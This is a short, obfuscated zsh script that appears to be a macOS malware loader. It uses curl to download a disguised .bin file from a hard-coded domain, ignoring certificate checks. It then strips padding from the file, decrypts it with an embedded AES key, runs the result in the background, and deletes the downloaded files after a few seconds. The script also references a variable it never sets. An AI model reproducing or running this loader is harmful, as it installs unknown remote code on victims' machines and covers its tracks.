#!/bin/zsh
vk7wv=$(mktemp /tmp/rbq4h8.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m6d8adac0f37d8fa6.bin" -o "$vk7wvz" || exit 1
fpmd42=$(stat -f %z "$vk7wvz"); bxe4u4a=$(( fpmd42 - 2348 - 3480 ))
tail -c +$(( 2348 + 1 )) "$vk7wvz" | head -c $bxe4u4a | openssl enc -d -aes-256-cbc -k fde87aaa163f6033ce42c1da -out "$vk7wv" 2>/dev/null
[ -s "$vk7wv" ] && chmod 700 "$vk7wv" && ( "$vk7wv" & ) && disown
( sleep 3; rm -f "$vk7wv" "$vk7wvz" ) &>/dev/null &
